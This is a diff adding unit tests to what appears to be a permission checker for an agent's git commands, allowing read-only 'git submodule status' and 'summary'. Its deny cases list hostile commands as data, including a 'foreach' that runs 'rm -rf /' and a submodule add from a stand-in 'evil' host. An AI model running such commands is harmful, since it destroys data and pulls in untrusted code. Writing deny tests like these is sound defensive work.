@@ -52,3 +52,29 @@ describe('the read group and git merge-base', () => {
     ]) expect(allows(c), c).toBe(false);
   });
 });
+
+// `git submodule status` is how an action learns whether a vendored path is populated and at
+// which pin. It was denied, so code.spec rounds guessed — and `git -C <empty-submodule-dir> log`
+// silently reports the PARENT repo's commits, so guessing wrong looks like an answer.
+describe('the read group and git submodule', () => {
+  it('allows the two read-only submodule subcommands', () => {
+    for (const c of [
+      'git submodule status',
+      'git submodule status --recursive',
+      'git submodule summary',
+      'git -C /Users/x/other submodule status',
+    ]) expect(allows(c), c).toBe(true);
+  });
+
+  it('admits nothing that writes or executes', () => {
+    for (const c of [
+      // These are the `edit` group's business, and `foreach` is not even that.
+      'git submodule update --init',
+      "git submodule foreach 'rm -rf /'",
+      'git submodule add https://evil/x.git vendor',
+      'git submodule deinit --all',
+      'git submodule sync',
+      'git submodule statuses',
+    ]) expect(allows(c), c).toBe(false);
+  });
+});
